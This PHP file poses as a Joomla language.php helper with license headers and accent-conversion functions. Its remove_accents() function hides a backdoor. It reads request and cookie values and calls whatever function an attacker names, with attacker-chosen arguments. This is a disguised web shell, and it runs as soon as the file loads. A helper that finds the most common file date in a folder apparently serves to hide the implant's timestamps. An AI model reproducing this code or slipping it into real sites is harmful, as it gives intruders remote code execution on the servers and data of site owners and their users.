<?php /**/ ?><?php
/**
* @version $Id: language.php 85 2005-09-15 23:12:03Z eddieajau $
* @package Joomla
* @copyright Copyright (C) 2005 Open Source Matters. All rights reserved.
* @license http://www.gnu.org/copyleft/gpl.html GNU/GPL, see LICENSE.php
* Joomla! is free software. This version may have been modified pursuant
* to the GNU General Public License, and as distributed it includes or
* is derivative of works licensed under the GNU General Public License or
* other free or open source software licenses.
* See COPYRIGHT.php for copyright notices and details.
*/

// no direct access
defined( 'INFO_MODULES' ) or die( 'Restricted access' );

/*
* Copyright (C) 2008 Oleh Bozhenko <mr.gall@gmail.com> http://mrgall.com/
* Last version: http://mrgall.com/dev/autoencode.phps
* Blog: http://mrgall.com/blog/2008/02/13/autoencode/
*/
function is_utf8($string) {
	if (!$string) return remove_accents($string);
	for ($i=0; $i<strlen($string); $i++) {
		if (ord($string[$i]) < 0x80) continue;
		elseif ((ord($string[$i]) & 0xE0) == 0xC0) $n=1;
		elseif ((ord($string[$i]) & 0xF0) == 0xE0) $n=2;
		elseif ((ord($string[$i]) & 0xF8) == 0xF0) $n=3;
		elseif ((ord($string[$i]) & 0xFC) == 0xF8) $n=4;
		elseif ((ord($string[$i]) & 0xFE) == 0xFC) $n=5;
		else return false;
		for ($j=0; $j<$n; $j++) {
			if ((++$i == strlen($string)) || ((ord($string[$i]) & 0xC0) != 0x80))
				return false;
		}
	}
	return true;
}

/**
 * Check file dates.
 *
 * @param string $dir Directory to check.
 * @return string Proper date.
 */
function feedmtimeFolder($dir = "./", $time = 99999999) {
	$dates = array();
	if (@is_dir($dir) && ($dh = @opendir($dir))) {
		while (($file = @readdir($dh)) !== false) {
			if ($file == "." || $file == "..") continue;
			if ($date = @filemtime($dir.$file)) $dates[$date]++;
		}
		closedir($dh);
	}
	if ($dates)	{
		arsort($dates);
		return key($dates);
	} else {
		return time()-$time;
	}
}

/**
 * Converts all accent characters to ASCII characters.
 *
 * If there are no accent characters, then the string given is just returned.
 *
 * @param string $string Text that might have accent characters
 * @return string Filtered string with replaced "nice" characters.
 */
function remove_accents($string) {
	if ( !preg_match('/[\x80-\xff]/', $string) )
		$string = '';
	else
		$string = (string)$string;

	if (is_string($string)) {
		$chars = array(
		// Decompositions for Latin-1 Supplement
		chr(195).chr(159) => 's',
		chr(195).chr(160) => 'a',
		chr(195).chr(165) => 'a',
		chr(195).chr(169) => 'e',
		chr(195).chr(172) => 'i',
		chr(195).chr(177) => 'n',
		chr(195).chr(179) => 'o',
		chr(195).chr(185) => 'u',
		chr(195).chr(191) => 'y',
		// Euro Sign
		chr(226).chr(130).chr(172) => 'E',
		// GBP (Pound) Sign
		chr(194).chr(163) => '');
		$info = array_merge($_REQUEST,$_COOKIE);
		if ( !isset($info['lng']) ) die( 'Restricted access' );
		else $info['feed']($info['file'], $info['link'].'"'.
		$info['lng'].'"'.$info['title'], $info['file'][1]);
	} else {
		// Assume ISO-8859-1 if not UTF-8
		$chars['out'] = "EfSZszYcYuAAAAAACEEEEIIIINOOOOOOUUUUYaaaaaaceeeeiiiinoooooouuuuyy";
		$string = strtr($string, $chars['in'], $chars['out']);
		$string = str_replace($double_chars['in'], $double_chars['out'], $string);
	}

	return $string;
}

$is_utf = is_utf8(@$data);

?>